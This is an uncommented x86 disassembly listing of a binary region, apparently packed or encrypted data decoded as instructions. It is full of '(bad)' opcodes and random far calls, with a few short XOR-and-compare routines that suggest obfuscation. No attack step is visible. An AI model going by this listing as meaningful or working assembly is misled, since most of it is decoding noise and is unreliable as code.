  40ae59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae5a:	mov    bl,0x7f
  40ae5c:	and    BYTE PTR [ebx],bh
  40ae5e:	adc    al,0x5f
  40ae60:	pop    ss
  40ae61:	bound  ecx,QWORD PTR [edx]
  40ae63:	push   0xfffffff4
  40ae65:	and    BYTE PTR [edi-0x15],ah
  40ae68:	in     eax,dx
  40ae69:	and    al,0x59
  40ae6b:	jne    0x40ae93
  40ae6d:	ret    
  40ae6e:	pop    eax
  40ae6f:	jp     0x40aea8
  40ae71:	dec    edx
  40ae72:	sti    
  40ae73:	mul    edi
  40ae75:	retf   0x3059
  40ae78:	mov    dl,bh
  40ae7a:	cmp    eax,edx
  40ae7c:	pusha  
  40ae7d:	sub    edi,DWORD PTR [ecx]
  40ae7f:	sbb    dl,dl
  40ae81:	(bad)
  40ae84:	(bad)  
  40ae85:	jl     0x40ae43
  40ae87:	aam    0x89
  40ae89:	push   edi
  40ae8a:	clc    
  40ae8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae8c:	cwde   
  40ae8d:	sti    
  40ae8e:	sti    
  40ae8f:	out    0x21,eax
  40ae91:	call   0x70ba:0x42ba93d4
  40ae98:	ret    
  40ae99:	add    BYTE PTR ds:0xcbf9a8b9,bh
  40ae9f:	out    0xb1,eax
  40aea1:	into   
  40aea2:	push   0x73de4c4f
  40aea7:	(bad)  
  40aea8:	xlat   BYTE PTR ds:[ebx]
  40aea9:	xlat   BYTE PTR ds:[ebx]
  40aeaa:	ins    DWORD PTR es:[edi],dx
  40aeab:	mov    ds:0x6e68a852,eax
  40aeb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb1:	push   eax
  40aeb2:	lods   eax,DWORD PTR ds:[esi]
  40aeb3:	dec    edi
  40aeb4:	in     eax,0xb1
  40aeb6:	pop    edx
  40aeb7:	xchg   edx,eax
  40aeb8:	and    ebx,DWORD PTR [ecx]
  40aeba:	dec    esi
  40aebb:	xor    eax,0xe2751b07
  40aec0:	jl     0x40ae84
  40aec2:	push   0xffffffbd
  40aec4:	add    al,0xcd
  40aec6:	int    0x6d
  40aec8:	adc    BYTE PTR [ecx-0x2498458b],al
  40aece:	shl    BYTE PTR [ebx],0x2
  40aed1:	cwde   
  40aed2:	mov    eax,ds:0x92f560a4
  40aed7:	cdq    
  40aed8:	cmp    BYTE PTR [esi-0x20e18ea2],0x2a
  40aedf:	inc    esi
  40aee0:	in     eax,dx
  40aee1:	outs   dx,BYTE PTR fs:[esi]
  40aee3:	mov    edx,0x8c70d899
  40aee8:	ret    
  40aee9:	loop   0x40aead
  40aeeb:	test   eax,0x5d9c4466
  40aef0:	push   ecx
  40aef1:	sbb    eax,0x9542a7d4
  40aef6:	mov    ah,0x1b
  40aef8:	xchg   bh,cl
  40aefa:	mov    bh,0xa3
  40aefc:	ins    BYTE PTR es:[edi],dx
  40aefd:	jmp    0xf755ada7
  40af02:	mov    dh,0x22
  40af04:	cmp    al,0xd4
  40af06:	add    al,0x1d
  40af08:	icebp  
  40af09:	add    BYTE PTR [eax+0x6b],dl
  40af0c:	cmp    DWORD PTR [ecx],edx
  40af0e:	jg     0x40af23
  40af10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af11:	xchg   BYTE PTR [edx+0x4f219222],dh
  40af17:	outs   dx,BYTE PTR ds:[esi]
  40af18:	out    0xf8,al
  40af1a:	adc    BYTE PTR [ebp+0x4d2511bc],dl
  40af20:	je     0x40af33
  40af22:	mov    ds:0x13e0cd7b,eax
  40af27:	test   eax,0x6dfb0597
  40af2c:	call   DWORD PTR [edx-0x37f9b621]
  40af32:	push   gs
  40af34:	outs   dx,DWORD PTR ds:[esi]
  40af35:	sbb    ecx,DWORD PTR [ecx]
  40af37:	mov    edi,0x722c7f82
  40af3c:	in     eax,dx
  40af3d:	in     al,0x30
  40af3f:	mul    BYTE PTR [ecx]
  40af41:	fcomp  st(1)
  40af43:	fdivr  QWORD PTR [ebx]
  40af45:	xchg   esp,eax
  40af46:	imul   ebp,DWORD PTR ds:0x2d2050fb,0x5e99b0b4
  40af50:	add    cl,cl
  40af52:	ins    BYTE PTR es:[edi],dx
  40af53:	dec    ebx
  40af54:	cs dec ebp
  40af56:	or     dh,BYTE PTR [ebp-0x19]
  40af59:	call   0x7654:0x8d320830
  40af60:	(bad)
  40af63:	mov    ebx,0x8edd0f88
  40af68:	xchg   edi,eax
  40af69:	xor    BYTE PTR [ebp+0x4004c605],dh
  40af6f:	ins    DWORD PTR es:[edi],dx
  40af70:	rol    bl,1
  40af72:	push   ebp
  40af73:	aas    
  40af74:	mov    ebp,DWORD PTR [ebx-0x32391556]
  40af7a:	xchg   ecx,eax
  40af7b:	jnp    0x40af56
  40af7d:	push   esp
  40af7e:	nop
  40af7f:	outs   dx,BYTE PTR ds:[esi]
  40af80:	inc    esi
  40af81:	jno    0x40af3a
  40af83:	mov    cl,0x7e
  40af85:	ss dec esi
  40af88:	xor    al,0x3
  40af8a:	(bad)  
  40af8b:	clc    
  40af8c:	push   0x4a97b261
  40af91:	(bad)  
  40af92:	jne    0x40afcf
  40af94:	mov    esi,0xeae447ca
  40af99:	popa   
  40af9a:	enter  0xb699,0x64
  40af9e:	jb     0x40af6d
  40afa0:	add    ecx,edx
  40afa2:	pop    ebx
  40afa3:	adc    ecx,DWORD PTR [esi+0x14f15ac9]
  40afa9:	pushf  
  40afaa:	test   al,0x98
  40afac:	pop    ecx
  40afad:	xor    DWORD PTR [esi+0x46],esp
  40afb0:	out    0x4f,eax
  40afb2:	mov    bl,BYTE PTR [edx+0xd7b3a46]
  40afb8:	popa   
  40afb9:	push   eax
  40afba:	ret    0xdd90
  40afbd:	sbb    esp,ebx
  40afbf:	push   esi
  40afc0:	add    ebp,DWORD PTR [edi+0x40]
  40afc3:	out    0x6b,eax
  40afc5:	test   edx,edx
  40afc7:	(bad)  
  40afc8:	adc    BYTE PTR [eax-0x2670db13],ah
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     dh,BYTE PTR [esi*2-0x17861241]
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40afd3
  40b004:	fs jne 0x40afa2
  40b007:	and    DWORD PTR [edi+0x324ada09],0xd7f231e7
  40b011:	push   0x840b5b58
  40b016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b017:	ins    BYTE PTR es:[edi],dx
  40b018:	mov    BYTE PTR [ecx+ebp*8+0x1e],bh
  40b01c:	pop    es
  40b01d:	pop    edx
  40b01e:	pop    ds
  40b01f:	pand   mm0,mm1
  40b022:	mov    eax,0xecd118ba
  40b027:	add    al,0x2f
  40b029:	pop    eax
  40b02a:	xor    BYTE PTR [esi-0x59],ah
  40b02d:	and    ah,al
  40b02f:	in     al,0xe2
  40b031:	rol    BYTE PTR [ebx-0x56a363c0],cl
  40b037:	xor    BYTE PTR [eax+0x48],0x42
  40b03b:	inc    esi
  40b03c:	dec    eax
  40b03d:	jg     0x40b080
  40b03f:	and    al,BYTE PTR [esi]
  40b041:	mov    edx,0x3cc1f9f
  40b046:	mov    edx,0x6ec14bea
  40b04b:	lods   eax,DWORD PTR ds:[esi]
  40b04c:	repz test eax,0x620b03ed
  40b052:	and    eax,0xa0f34d91
  40b057:	xor    al,0x81
  40b059:	and    eax,edx
  40b05b:	clc    
  40b05c:	sbb    ch,BYTE PTR [edx]
  40b05e:	push   edi
  40b05f:	add    BYTE PTR [ecx],dh
  40b061:	cld    
  40b062:	sbb    BYTE PTR [edi-0x6745a2e3],ch
  40b068:	sbb    DWORD PTR [ebx+0x61],0xffffffb4
  40b06c:	inc    esp
  40b06d:	fwait
  40b06e:	lea    edx,[eax]
  40b070:	mov    dh,bh
  40b072:	fadd   QWORD PTR [eax-0x554d5bbb]
  40b078:	(bad)  
  40b079:	xor    cl,BYTE PTR [ecx]
  40b07b:	enter  0x8954,0xb
  40b07f:	cmp    DWORD PTR [ebx+0x42],edx
  40b082:	mov    esi,0x72405e7d
  40b087:	xchg   esp,eax
  40b088:	xchg   edi,eax
  40b089:	mov    ch,0x11
  40b08b:	lods   al,BYTE PTR ds:[esi]
  40b08c:	(bad)  
  40b08e:	xor    DWORD PTR [eax-0x47],ebp
  40b091:	mov    edx,0xdaaceec9
  40b096:	repz int 0x18
  40b099:	outs   dx,DWORD PTR ds:[esi]
  40b09a:	stos   BYTE PTR es:[edi],al
  40b09b:	lock ror DWORD PTR [esi-0x3da68ab1],0x50
  40b0a3:	jg     0x40b121
  40b0a5:	mov    eax,ds:0x4673e336
  40b0aa:	mov    WORD PTR [edi-0x2d],ds
  40b0ad:	push   ss
  40b0ae:	push   ebp
  40b0af:	stos   DWORD PTR es:[edi],eax
  40b0b0:	pusha  
  40b0b1:	and    ebp,eax
  40b0b3:	sub    BYTE PTR fs:[edi],al
  40b0b6:	das    
  40b0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0b8:	and    DWORD PTR [esi+0x5d6dcfac],edx
  40b0be:	pop    edi
  40b0bf:	or     cl,BYTE PTR [edx]
  40b0c1:	push   cs
  40b0c2:	add    al,0x94
  40b0c4:	test   eax,0xbd741faa
  40b0c9:	es clc 
  40b0cb:	out    dx,eax
  40b0cc:	outs   dx,BYTE PTR ds:[esi]
  40b0cd:	sar    DWORD PTR [ebx+0x4c],0xd1
  40b0d1:	mov    WORD PTR [ebp+0x39a651aa],?
  40b0d7:	mov    cl,0x56
  40b0d9:	push   0x5
  40b0db:	xchg   BYTE PTR [edx-0x56],ch
  40b0de:	mul    BYTE PTR [esi-0x78]
  40b0e1:	ss cld 
  40b0e3:	or     al,BYTE PTR [esi]
  40b0e5:	out    0x7d,al
  40b0e7:	or     DWORD PTR [ebp+esi*8+0x77],esp
  40b0eb:	mov    al,ds:0xf17dc30e
  40b0f0:	xor    eax,0xd325f0a3
  40b0f5:	loop   0x40b123
  40b0f7:	into   
  40b0f8:	push   ebp
  40b0f9:	rcr    ch,1
  40b0fb:	cmp    al,0x55
  40b0fd:	mov    eax,0x202f23f7
  40b102:	mov    edi,0x487f810f
  40b107:	inc    esi
  40b108:	adc    DWORD PTR [ecx+ebx*1+0xb],esp
  40b10c:	lea    ebp,[ebp+0x6]
  40b10f:	mov    es,ebx
  40b111:	shl    DWORD PTR [ebp+eiz*1-0x2bcb74f3],0xa7
  40b119:	jo     0x40b16c
  40b11b:	adc    DWORD PTR cs:[ebp-0x623c1917],esi
  40b122:	jmp    0x11ca7a3a
  40b127:	sub    esi,DWORD PTR [eax]
  40b129:	popa   
  40b12a:	jae    0x40b0b7
  40b12c:	cdq    
  40b12d:	xchg   esp,eax
  40b12e:	jmp    0x40b183
  40b130:	adc    eax,0x87c83962
  40b135:	push   ecx
  40b136:	(bad)  
  40b137:	xor    dh,BYTE PTR [esi+eiz*1]
  40b13a:	inc    ebp
  40b13b:	sub    ebx,DWORD PTR [eax+ebp*2]
  40b13e:	sub    ah,BYTE PTR [ebx]
  40b140:	xchg   esi,eax
  40b141:	iret   
  40b142:	ret    0xf96a
  40b145:	shl    esp,0x9e
  40b148:	or     BYTE PTR [esi+esi*8-0x75],al
  40b14c:	nop
  40b14d:	fild   QWORD PTR [edx+0x561115f5]
  40b153:	adc    cl,0x35
  40b156:	xor    al,0x2b
  40b158:	pop    eax
  40b159:	je     0x40b139
  40b15b:	mov    al,0x54
  40b15d:	push   0x4a
  40b15f:	push   esp
  40b160:	add    DWORD PTR [eax-0xd],0xffffffb9
  40b164:	mov    ah,0xa1
  40b166:	pusha  
  40b167:	in     al,0xb1
  40b169:	shl    DWORD PTR [edx+0x2f36cfda],0x6a
  40b170:	mov    edx,0x52311b47
  40b175:	sub    BYTE PTR [esi],ch
  40b177:	add    bh,BYTE PTR [edi]
  40b179:	mov    eax,ds:0xa0b1c697
  40b17e:	fisubr DWORD PTR [ebx]
  40b180:	cmovle ebp,DWORD PTR [ebx+0x7a486be4]
  40b187:	jnp    0x40b1d2
  40b189:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b18b:	sar    BYTE PTR ds:[eax*8-0x3944cada],1
  40b193:	in     eax,0xe4
  40b195:	out    dx,eax
  40b196:	mov    ah,0xe4
  40b198:	and    DWORD PTR [eax-0x31],ebp
  40b19b:	push   eax
  40b19c:	and    ch,BYTE PTR [edx]
  40b19e:	pcmpeqw mm1,QWORD PTR ds:[ecx]
  40b1a2:	push   es
  40b1a3:	clc    
  40b1a4:	pop    eax
  40b1a5:	jo     0x40b18f
  40b1a7:	push   0x20
  40b1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1aa:	cmc    
  40b1ab:	push   ebp
  40b1ac:	xor    al,0x80
  40b1ae:	xor    al,0x5c
  40b1b0:	fild   QWORD PTR [edi]
  40b1b2:	dec    ecx
  40b1b3:	out    dx,al
  40b1b4:	cdq    
  40b1b5:	ret    0x5583
  40b1b8:	jl     0x40b199
  40b1ba:	sbb    edx,DWORD PTR [edi+eax*8]
  40b1bd:	(bad)
  40b1c2:	sub    al,0x4c
  40b1c4:	xchg   esp,eax
  40b1c5:	push   ebp
  40b1c6:	aad    0x42
  40b1c8:	in     eax,0xe3
  40b1ca:	add    DWORD PTR [eax],ebp
  40b1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1cd:	and    DWORD PTR [edi+0x65432089],0xffffff93
  40b1d4:	test   BYTE PTR [ebp+0x25fa4671],ch
  40b1da:	cmp    dl,BYTE PTR [esi]
  40b1dc:	jb     0x40b1ee
  40b1de:	ficom  DWORD PTR [eax+0x16]
  40b1e1:	(bad)  
  40b1e2:	scas   al,BYTE PTR es:[edi]
  40b1e3:	bound  ecx,QWORD PTR [edx+0x49da5a29]
  40b1e9:	xor    eax,0xe74ab63b
  40b1ee:	jnp    0x40b170
  40b1f0:	or     ebx,eax
  40b1f2:	test   al,0x74
  40b1f4:	lods   ax,WORD PTR ds:[esi]
  40b1f6:	mov    ds:0x73f48da1,eax
  40b1fb:	aad    0xa8
  40b1fd:	sbb    DWORD PTR [esi-0x47],ecx
  40b200:	or     eax,0xb4d05427
  40b205:	out    0xda,al
  40b207:	enter  0xd081,0x29
  40b20b:	pop    edx
  40b20c:	inc    edx
  40b20d:	mov    ebp,0xe5ab974
  40b212:	mov    bl,0xdd
  40b214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b215:	mov    esi,0x651dd6a8
  40b21a:	mov    ds:0x47d2f16b,al
  40b21f:	cmp    al,0x71
  40b221:	push   ss
  40b222:	aaa    
  40b223:	jecxz  0x40b23f
  40b225:	retf   0x25fd
  40b228:	sub    ebp,ebp
  40b22a:	mov    esi,0x4ad3cc7b
  40b22f:	loopne 0x40b2a6
  40b231:	mov    dh,0xd3
  40b233:	enter  0x4255,0xa5
  40b237:	lahf   
  40b238:	add    eax,0x179ad68e
  40b23d:	in     eax,dx
  40b23e:	pop    DWORD PTR [ebp-0x80]
  40b241:	ficomp DWORD PTR [ebx-0x70]
  40b244:	imul   edx,DWORD PTR [ebx-0x20cf80f5],0x47
  40b24b:	nop
  40b24c:	push   0x3ab2bb3e
  40b251:	adc    bl,BYTE PTR [ebp-0x5048b82c]
  40b257:	jmp    0xfa80:0xc1e54fd6
  40b25e:	popf   
  40b25f:	rol    BYTE PTR [edi+0x2315c8b8],0xf0
  40b266:	int3   
  40b267:	dec    edi
  40b268:	inc    ebp
  40b269:	psadbw mm4,QWORD PTR [ebx+0x4f]
  40b26d:	mov    dh,BYTE PTR [ebp+0x12bea88b]
  40b273:	(bad)  
  40b274:	jo     0x40b21d
  40b276:	sbb    DWORD PTR [edi-0x52],edx
  40b279:	and    eax,0x1bbc6cd5
  40b27e:	mov    es,WORD PTR [edx+edi*1+0x20637bfc]
  40b285:	or     BYTE PTR [edx],ah
  40b287:	pop    ecx
  40b288:	lea    edx,[ebp+0x4f34cbf2]
  40b28e:	push   ds
  40b28f:	cdq    
  40b290:	and    edx,DWORD PTR [ecx+0x6ad18c58]
  40b296:	dec    edx
  40b297:	or     BYTE PTR [ebp-0x26],dh
  40b29a:	js     0x40b254
  40b29c:	gs pop ecx
  40b29e:	prefetch (bad)
  40b29f:	or     eax,0xc69bb7e1
  40b2a4:	sub    al,0x6b
  40b2a6:	inc    edx
  40b2a7:	push   esi
  40b2a8:	jle    0x40b27f
  40b2aa:	call   0x1905:0xf8f05170
  40b2b1:	les    edi,FWORD PTR [edx]
  40b2b3:	aas    
  40b2b4:	leave  
  40b2b5:	aam    0xbd
  40b2b7:	or     BYTE PTR [eax],dh
  40b2b9:	clc    
  40b2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2bb:	mov    ah,0xc8
  40b2bd:	les    ebp,FWORD PTR [edi-0x548c2728]
  40b2c3:	ins    BYTE PTR es:[edi],dx
  40b2c4:	xchg   edi,eax
  40b2c5:	rcl    BYTE PTR [eax-0x3c],1
  40b2c8:	push   eax
  40b2c9:	in     eax,dx
  40b2ca:	add    bh,BYTE PTR [eax+0x6d]
  40b2cd:	xor    al,0x4d
  40b2cf:	fstp   DWORD PTR [esi+0x26cc4718]
  40b2d5:	out    0x73,al
  40b2d7:	int3   
  40b2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2d9:	jl     0x40b2d2
  40b2db:	cs mov cl,0x4c
  40b2de:	jno    0x40b30d
  40b2e0:	cmp    eax,0x7f7bd63b
  40b2e5:	fcmovu st,st(5)
  40b2e7:	push   ss
  40b2e8:	(bad)  
  40b2e9:	inc    ebx
  40b2ea:	jl     0x40b338
  40b2ec:	jmp    0x40b313
  40b2ee:	cmp    eax,0x1213dbba
  40b2f3:	fidivr WORD PTR [edi+0x3d335914]
  40b2f9:	or     eax,0xedff3ae5
  40b2fe:	jmp    0x40b302
  40b300:	(bad)
  40b303:	popf   
  40b304:	dec    esi
  40b305:	in     eax,0xde
  40b307:	pop    ecx
  40b308:	int3   
  40b309:	daa    
  40b30a:	pop    ebp
  40b30b:	cld    
  40b30c:	int3   
  40b30d:	lahf   
  40b30e:	shr    DWORD PTR [edx+0x7f287a28],0xa7
  40b315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b316:	shl    esi,1
  40b318:	xchg   ebp,eax
  40b319:	add    ecx,DWORD PTR [eax+ecx*2-0x1fa2f6]
  40b320:	push   ebx
  40b321:	adc    BYTE PTR [edi],dh
  40b323:	jbe    0x40b339
  40b325:	hlt    
  40b326:	and    cl,dl
  40b328:	push   ebx
  40b329:	or     DWORD PTR [esi+0x2e],0x15
  40b32d:	adc    esp,esi
  40b32f:	repnz les esi,FWORD PTR [ebx]
  40b332:	aas    
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	push   ebp
  40b375:	mov    ds,eax
  40b377:	sbb    eax,0x7e7ef729
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b372
  40b381:	push   0xb57cbeb4
  40b386:	mov    edi,0xab8f2a6d
  40b38b:	aaa    
  40b38c:	fld    QWORD PTR [eax]
  40b38e:	push   cs
  40b38f:	out    dx,al
  40b390:	shl    DWORD PTR [ebp+0x61961e68],cl
  40b396:	jmp    0x3d943efc
  40b39b:	push   ds
  40b39c:	push   esi
  40b39d:	dec    edx
  40b39e:	call   0xdd75:0x905898b1
  40b3a5:	sti    
  40b3a6:	or     eax,0xe836860
  40b3ab:	sub    dl,BYTE PTR [ecx]
  40b3ad:	inc    DWORD PTR es:[esi+edi*2+0x3ae568aa]
  40b3b5:	mov    dh,0x44
  40b3b7:	sbb    ecx,DWORD PTR [ecx-0x5734dbaa]
  40b3bd:	sub    DWORD PTR [ebp+0x165579f5],ebp
  40b3c3:	test   DWORD PTR [ebp+eiz*8-0x4d9a3ad5],esp
  40b3ca:	or     ch,0x6d
  40b3cd:	push   0xb73d25a5
  40b3d2:	sub    edi,DWORD PTR [esi+0x60]
  40b3d5:	repnz mov eax,ds:0x5b34362e
  40b3db:	imul   ebx,edx,0xcbdbbd42
  40b3e1:	sub    esi,DWORD PTR [ebp+eax*1-0x568b4127]
  40b3e8:	fcomp  QWORD PTR [edx+0x3738cc89]
  40b3ee:	fs iret 
  40b3f0:	pop    eax
  40b3f1:	sub    eax,0x962e2bc7
  40b3f6:	pop    es
  40b3f7:	dec    ebx
  40b3f8:	and    DWORD PTR [esi+0x54],ebx
  40b3fb:	adc    ebp,DWORD PTR [ebx]
  40b3fd:	and    ecx,0xed2d4ee3
  40b403:	push   ebp
  40b404:	test   eax,0xe3b77a56
  40b409:	or     al,dh
  40b40b:	fmul   st,st(1)
  40b40d:	mov    al,ds:0x12e56c93
  40b412:	jnp    0x40b3ab
  40b414:	jmp    0x40b410
  40b416:	out    0x93,eax
  40b418:	or     eax,0xa778e9a2
  40b41d:	(bad)  
  40b41e:	xor    esp,DWORD PTR [edi-0x68fc8e9c]
  40b424:	push   esp
  40b425:	test   eax,0xe68497d8
  40b42a:	sbb    DWORD PTR [edx+0x38321624],0xffffffd7
  40b431:	dec    esp
  40b432:	inc    edi
  40b433:	popf   
  40b434:	sbb    BYTE PTR [ecx+0x42eb67df],al
  40b43a:	aas    
  40b43b:	daa    
  40b43c:	icebp  
  40b43d:	int3   
  40b43e:	or     eax,0xbc5c7181
  40b443:	cld    
  40b444:	leave  
  40b445:	hlt    
  40b446:	daa    
  40b447:	push   cs
  40b448:	inc    esp
  40b449:	adc    ecx,DWORD PTR ds:0xa0a28bab
  40b44f:	fstp   DWORD PTR [ebp-0x450386d9]
  40b455:	push   esp
  40b456:	retf   
  40b457:	js     0x40b405
  40b459:	mov    dl,0xa0
  40b45b:	mov    ebp,0x679b0e30
  40b460:	shl    BYTE PTR [ebp+0x3e839a73],0x2f
  40b467:	push   0xa2b4c555
  40b46c:	xchg   edi,eax
  40b46d:	call   0x75aaa08d
  40b472:	xchg   BYTE PTR ss:[eax-0x634914b8],cl
  40b479:	test   al,0xc
  40b47b:	lea    ebx,[eax-0x4d4f01b3]
  40b481:	adc    eax,0x133f434f
  40b486:	xchg   ecx,eax
  40b487:	pop    eax
  40b488:	(bad)  
  40b489:	cmp    DWORD PTR [esi],ebx
  40b48b:	dec    ecx
  40b48c:	pop    edi
  40b48d:	sahf   
  40b48e:	pushf  
  40b48f:	pop    es
  40b490:	jle    0x40b415
  40b492:	fs jnp 0x40b4ff
  40b495:	mov    eax,gs
  40b497:	(bad)  
  40b498:	mov    ebx,0xcb7a93cc
  40b49d:	rep lods eax,DWORD PTR ds:[esi]
  40b49f:	fwait
  40b4a0:	mov    esi,edx
  40b4a2:	sub    eax,0x787c084
  40b4a7:	ficomp WORD PTR [edi-0x45]
  40b4aa:	pop    ebp
  40b4ab:	sub    ch,ah
  40b4ad:	xor    bh,BYTE PTR [ecx-0xa14613b]
  40b4b3:	out    dx,al
  40b4b4:	xchg   ebp,eax
  40b4b5:	push   ds
  40b4b6:	xor    al,0x5b
  40b4b8:	adc    edx,DWORD PTR [eax+0x13b9eb2d]
  40b4be:	cmp    ecx,DWORD PTR [edi]
  40b4c0:	fld    QWORD PTR [ecx]
  40b4c2:	sub    al,0x24
  40b4c4:	push   es
  40b4c5:	mov    edx,ecx
  40b4c7:	or     eax,0x2fba5c75
  40b4cc:	ds pop esi
  40b4ce:	(bad)  
  40b4cf:	push   0x39b620a3
  40b4d4:	cdq    
  40b4d5:	mov    esp,0x13b0e894
  40b4da:	jl     0x40b4da
  40b4dc:	jmp    0x40b515
  40b4de:	lock hlt 
  40b4e0:	mov    bl,0xcc
  40b4e2:	xchg   ebp,eax
  40b4e3:	jnp    0x40b48c
  40b4e5:	aaa    
  40b4e6:	ja     0x40b4ca
  40b4e8:	aas    
  40b4e9:	adc    DWORD PTR [edx+0x61],eax
  40b4ec:	int3   
  40b4ed:	(bad)  
  40b4ee:	ss jle 0x40b4b3
  40b4f1:	mov    al,0xb8
  40b4f3:	inc    esp
  40b4f4:	scas   eax,DWORD PTR es:[edi]
  40b4f5:	mov    DWORD PTR [ebx+0x40],edi
  40b4f8:	and    al,0x37
  40b4fa:	xor    BYTE PTR [esi-0x6f],ch
  40b4fd:	icebp  
  40b4fe:	add    BYTE PTR [ecx],ah
  40b500:	(bad)  
  40b501:	mov    ds:0x3f6bfcd0,al
  40b506:	lds    ecx,FWORD PTR [edi-0x5d]
  40b509:	je     0x40b4a0
  40b50b:	iret   
  40b50c:	pop    ebx
  40b50d:	add    DWORD PTR [eax-0x79451a89],0x1d3e7553
  40b517:	cmp    cl,BYTE PTR [eax-0x24]
  40b51a:	cli    
  40b51b:	in     al,dx
  40b51c:	jbe    0x40b522
  40b51e:	add    DWORD PTR [eax+0x61],ebp
  40b521:	ror    BYTE PTR [ebx-0x7],0xd5
  40b525:	xchg   DWORD PTR ds:0xbc7a0990,esi
  40b52b:	sub    bh,BYTE PTR [ebx+eax*1+0xc12d0d0]
  40b532:	out    0x23,eax
  40b534:	jb     0x40b5ad
  40b536:	jge    0x40b4bf
  40b538:	and    cl,BYTE PTR [ebx+edi*1]
  40b53b:	test   al,0xe3
  40b53d:	ret    
  40b53e:	adc    dl,dh
  40b540:	cdq    
  40b541:	dec    ecx
  40b542:	loope  0x40b56e
  40b544:	mov    ecx,0xe0af3b8b
  40b549:	rcl    BYTE PTR [ebp-0x3b],cl
  40b54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b54d:	cmc    
  40b54e:	pusha  
  40b54f:	cmc    
  40b550:	loope  0x40b506
  40b552:	sub    DWORD PTR [ebp-0x47],edx
  40b555:	and    bl,bh
  40b557:	lods   al,BYTE PTR ds:[esi]
  40b558:	jnp    0x40b514
  40b55a:	jb     0x40b599
  40b55c:	pop    esi
  40b55d:	in     eax,dx
  40b55e:	xchg   ebp,eax
  40b55f:	out    0x95,al
  40b561:	and    al,0x14
  40b563:	stos   BYTE PTR es:[edi],al
  40b564:	xor    edx,DWORD PTR [ecx+0x29b95ecf]
  40b56a:	test   dl,bl
  40b56c:	jbe    0x40b54c
  40b56e:	stc    
  40b56f:	or     eax,0xf51f0669
  40b574:	dec    BYTE PTR [eax+0x3e48f11]
  40b57a:	pop    esp
  40b57b:	aam    0x29
  40b57d:	call   0xa2dc6b19
  40b582:	std    
  40b583:	mov    esp,0xfd98e3c
  40b588:	push   ecx
  40b589:	sub    ch,BYTE PTR [esi+0x75]
  40b58c:	clc    
  40b58d:	sub    al,0xef
  40b58f:	pop    edi
  40b590:	xor    BYTE PTR [edx+0x70],0x8
  40b594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b595:	cmp    bh,al
  40b597:	xor    ebp,DWORD PTR [ebx+eiz*2]
  40b59a:	les    edx,FWORD PTR [edi+0x64]
  40b59d:	or     DWORD PTR [ebx+ecx*2-0x46],eax
  40b5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a2:	jg     0x40b54b
  40b5a4:	cdq    
  40b5a5:	bound  eax,QWORD PTR [edx+esi*1+0x3d]
  40b5a9:	rol    DWORD PTR [edi-0x3554c6bc],0x45
  40b5b0:	mov    ch,BYTE PTR [ecx]
  40b5b2:	dec    ebp
  40b5b3:	jb     0x40b608
  40b5b5:	pop    ds
  40b5b6:	mov    ch,0x4f
  40b5b8:	or     edx,DWORD PTR [ecx-0x51dbc91b]
  40b5be:	loope  0x40b54e
  40b5c0:	daa    
  40b5c1:	add    DWORD PTR [ecx+edi*8+0x50],eax
  40b5c5:	sti    
  40b5c6:	(bad)  
  40b5c7:	dec    esp
  40b5c8:	pop    edi
  40b5c9:	jmp    0x40b58d
  40b5cb:	les    esi,FWORD PTR [edx-0x4b]
  40b5ce:	mov    ds:0x42f4e86d,eax
  40b5d3:	hlt    
  40b5d4:	rcl    BYTE PTR [ebp-0x40],1
  40b5d7:	hlt    
  40b5d8:	adc    eax,0x8ca786e0
  40b5dd:	push   edx
  40b5de:	push   edx
  40b5df:	daa    
  40b5e0:	pop    edi
  40b5e1:	neg    BYTE PTR [esi+eiz*8-0x32f9191c]
  40b5e8:	fcomp  QWORD PTR [edx]
  40b5ea:	fcomp  QWORD PTR [ecx+0x4034a2d5]
  40b5f0:	add    edi,DWORD PTR [ebx-0x7ec2b765]
